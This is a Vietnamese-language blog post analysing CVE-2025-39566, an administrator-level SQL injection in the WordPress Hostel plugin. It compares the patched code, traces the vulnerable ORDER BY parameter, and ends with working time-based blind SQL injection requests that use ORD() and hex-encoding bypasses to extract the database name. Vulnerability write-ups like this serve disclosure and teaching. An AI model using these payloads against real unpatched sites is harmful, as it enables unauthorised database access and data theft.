---
title: CVE-2025-39566 Analysis & POC
description: Security Vulnerability in WordPress Hostel Plugin.
date: 2025-09-21 22:27:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, sqli]
---

L·ªó h·ªïng trong plugin **Hostel** tr∆∞·ªõc phi√™n b·∫£n **1.1.5.7**. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.
- **CVE ID**: [CVE-2025-39566](https://www.cve.org/CVERecord?id=CVE-2025-39566)
- **Product**: [WordPress Hostel Plugin](https://wordpress.org/plugins/hostel/)
- **Vulnerability Type**: SQL Injection  
- **Affected Versions**: <= 1.1.5.6  
- **CVSS severity**: 7.6 (High)  
- **Required Privilege**: Administrator  

---

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/)
- **Hostel Plugin**:  v1.1.5.6(vul) v√† v1.1.5.7(fix)
- **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

---

## Analysis
Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ **GET** request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.

### Patch Diff
D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file **controllers/bookings.php**

**B·∫£n l·ªó h·ªïng**:
```php
if(!empty($_GET['ob'])) {					
    $orderby = "ORDER BY ".sanitize_text_field($_GET['ob']) . ' ' . $dir;
}
```

**B·∫£n v√°**:

```php
if(!empty($_GET['ob'])) {
    $ob = sanitize_text_field($_GET['ob']);
    if(!in_array($ob, ['tB.id', 'tB.contact_name', 'tB.contact_email', 'tB.from_date', 'tB.amount_paid', 'tB.status'])) {
        $ob = 'tB.id';
    }
    $orderby = "ORDER BY $ob $dir";
}
```

![Diff Patch](images/posts/2025-08-25-CVE-2025-39566/diff_patch.png)

üëâ B·∫£n v√° s·ª≠ d·ª•ng **whitelist** ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ `'tB.id'`.

**Analysis**: L·ªó h·ªïng xu·∫•t hi·ªán khi param `ob` ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ `ORDER BY` th√¥ng qua h√†m `sanitize_text_field()`, ch·ªâ escape m√† kh√¥ng filter SQLi.

### How it work?
ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y

```php
$bookings = $wpdb->get_results("SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM ".WPHOSTEL_BOOKINGS." tB JOIN ".WPHOSTEL_ROOMS." tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql");
```

C√¢u query n·∫±m trong nh√°nh `default` c·ªßa c·∫•u tr√∫c `switch`.

To√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static `manage()` c·ªßa class `WPHostelBookings`.

```php
class WPHostelBookings {
    static function manage() {
        global $wpdb;
        $_booking = new WPHostelBooking();

        switch(@$_GET['do']) {
            case 'add': // add handle
            break;

            case 'edit': // edit handle
            break;

            // view/print booking details. Will allow also to confirm/cancel
            case 'view': // view handle			
            break;			

            // list bookings
            default:
            // another logic

            if(!empty($_GET['ob'])) {					
                $orderby = "ORDER BY ".sanitize_text_field($_GET['ob']) . ' ' . $dir;
            }

            $bookings = $wpdb->get_results("SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room 
            FROM ".WPHOSTEL_BOOKINGS." tB JOIN ".WPHOSTEL_ROOMS." tR ON tR.id = tB.room_id
            WHERE is_static=0 $where_sql $orderby $limit_sql");

            // another logic
            break;
        }
    }
}
```

Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua **Plugin API (Hook System)**. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m `manage()` ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a `"manage"` trong th∆∞ m·ª•c ch·ª©a plugin.

![search manage()](images/posts/2025-08-25-CVE-2025-39566/search_manage.png)

Trong file `models/hostel.php` ta c√≥ h√†m:

```php
class class WPHostel {
    // another logic

    static function menu() {
        // we use 'hostelpro_manage' for consistency with the pro version
        $wphostel_caps = current_user_can('manage_options') ? 'manage_options' : 'hostelpro_manage';     

        add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, "wphostel_options", 
            array(__CLASS__, "options"));
        add_submenu_page('wphostel_options', __('Settings', 'wphostel'), __('Settings', 'wphostel'), $wphostel_caps, "wphostel_options", 
            array(__CLASS__, "options"));
        add_submenu_page('wphostel_options', __("Manage Rooms", 'wphostel'), __("Manage Rooms", 'wphostel'), $wphostel_caps, 'wphostel_rooms', array('WPHostelRooms', "manage"));
        add_submenu_page('wphostel_options', __("Manage Bookings", 'wphostel'), __("Manage Bookings", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', "manage")); 
        add_submenu_page('wphostel_options', __("Unavailable Dates", 'wphostel'), __("Unavailable Dates", 'wphostel'), $wphostel_caps, 'wphostel_unavailable', array('WPHostelBookings', "unavailable")); 
        add_submenu_page('wphostel_options', __("Email Log", 'wphostel'), __("Email Log", 'wphostel'), $wphostel_caps, 'wphostel_emaillog', array('WPHostelHelp', "email_log"));
        add_submenu_page('wphostel_options', __("Help", 'wphostel'), __("Help", 'wphostel'), $wphostel_caps, 'wphostel_help', array('WPHostelHelp', "index"));     
    }

    // another logic
}
```

·ªû ƒë√¢y:
- `add_menu_page()` t·∫°o **menu ch√≠nh** trong Admin Dashboard.
- `add_submenu_page()` th√™m c√°c **submenu** con cho menu ƒë√≥.
- Tham s·ªë `$callback` l√† m·ªôt **callback function** s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu.

V√≠ d·ª•:

```php
// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = '', $icon_url = '', $position = null);
add_menu_page(__('Hostel', 'wphostel'), __('Hostel', 'wphostel'), $wphostel_caps, "wphostel_options", 
    array(__CLASS__, "options"));

// add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = '');
add_submenu_page('wphostel_options', __("Manage Bookings", 'wphostel'), __("Manage Bookings", 'wphostel'), $wphostel_caps, 'wphostel_bookings', array('WPHostelBookings', "manage"));

// array('WPHostelBookings', "manage")); => WPHostelBookings::manage()
```

T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static `menu()` c·ªßa class `WPHostel`. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m `menu()` ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a `menu` trong th∆∞ m·ª•c ch·ª©a plugin.

![search menu()](images/posts/2025-08-25-CVE-2025-39566/search_menu.png)

Trong file `hostel.php` ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:

```php
add_action('admin_menu', array("WPHostel", "menu"));

// => callback: WPHostel::menu()
```


- `add_action()` l√† m·ªôt **Plugin API** c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt **callback** v√†o m·ªôt **action hook**.
- Hook name ·ªü ƒë√¢y l√† `admin_menu`, nghƒ©a l√† h√†m `WPHostel::menu()` s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu.

**Menu tr√™n UI Admin Dashboard**

![ui menu](images/posts/2025-08-25-CVE-2025-39566/menu_ui.png)

**Debugging**

- Ch·ª©c nƒÉng b·ªã l·ªói n·∫±m trong **Booking Manager**, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu `Manager Bookings` tr√™n UI Admin Dashboard.
- Ngay tr∆∞·ªõc nh√°nh default c√≥ comment `// list bookings` => cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác **li·ªát k√™ v√† s·∫Øp x·∫øp bookings**
- M·ªü debugger:
    - Click <kbd>Run with Debugger</kbd>.
    - ƒê·∫∑t **breakpoint** t·∫°i **nh√°nh switch ch·ª©a code l·ªói** v√† **t·∫°i d√≤ng code g√¢y l·ªói**.
- Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t:
    - Debugger nh·∫£y v√†o c·∫•u tr√∫c `switch`.
    - D√πng **Step Over**, debugger ƒëi ti·∫øp v√†o nh√°nh `default`.
    - Ti·∫øp t·ª•c **Step Over** v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab `Variables > Locals`. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi.

Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:

```sql
SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room 
FROM wp_hostel_bookings tB 
JOIN wp_hostel_rooms tR ON tR.id = tB.room_id 
WHERE is_static=0 AND tB.id = ... 
ORDER BY tB.amount_paid ASC|DESC 
LIMIT ...
```

ƒê√°ng ch√∫ √Ω, bi·∫øn `$orderby` ƒë∆∞·ª£c g√°n nh∆∞ sau:

```php
if(!empty($_GET['ob'])) {					
    $orderby = "ORDER BY ".sanitize_text_field($_GET['ob']) . ' ' . $dir;
}
```

‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:
- Ph·∫ßn sau `ORDER BY` s·ª≠ d·ª•ng `sanitize_text_field()`.
- H√†m n√†y ch·ªâ **l√†m s·∫°ch HTML**, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong **SQL context**.
- Tham s·ªë `ob` (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ **ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL**.

---

## Exploit
### Detect SQLi

**Request with BurpSuite**:

```http
GET /wp-admin/admin.php?page=wphostel_bookings&type=upcoming&ob=tB.status,(SELECT+SLEEP(10))&dir=ASC HTTP/1.1
```

Ta t√°ch m·ªánh ƒë·ªÅ `ORDER BY` b·∫±ng `,` v√¨ n√≥ ch·∫•p nh·∫≠p **multi column**

![time response](images/posts/2025-08-25-CVE-2025-39566/time_response.png)

K·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay => SQL Injection th√†nh c√¥ng.

### Dump Data from Database

**Bypass `'` using ORD()**:

ƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa **database name**.

Do `sanitize_text_field()` lo·∫°i b·ªè `'`, ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng `ORD()` ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:

```http
GET /wp-admin/admin.php?page=wphostel_bookings&type=past&ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))&dir=ASC HTTP/1.1
```
Th√†nh c√¥ng bypass => c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.

![ORD bypass](images/posts/2025-08-25-CVE-2025-39566/ord_bypass.png)

**Bypass `'` using Hex encoding (extend)**

Ngo√†i `ORD()` ta c√≥ th·ªÉ s·ª≠ d·ª•ng **Hex encoding** ƒë·ªÉ bypass

```http
GET /wp-admin/admin.php?page=wphostel_bookings&type=past&ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))&dir=ASC HTTP/1.1
```

Th√†nh c√¥ng bypass => c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.

![Hex encoding bypass](images/posts/2025-08-25-CVE-2025-39566/ord_bypass.png)

---

## Conclusion

L·ªó h·ªïng **CVE-2025-39566** trong plugin WordPress **Hostel** tr∆∞·ªõc phi√™n b·∫£n **1.1.5.7**, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

**Key takeaways**:

- `sanitize_text_field()` ‚â† ch·ªëng **SQL Injection**
- C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL

---

## References

[SQL Injection Cheat Sheet ‚Äì PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress Hostel Plugin <= 1.1.5.6 is vulnerable to SQL Injection - patchstack](https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-1-1-5-6-sql-injection-vulnerability?_s_id=cve)

---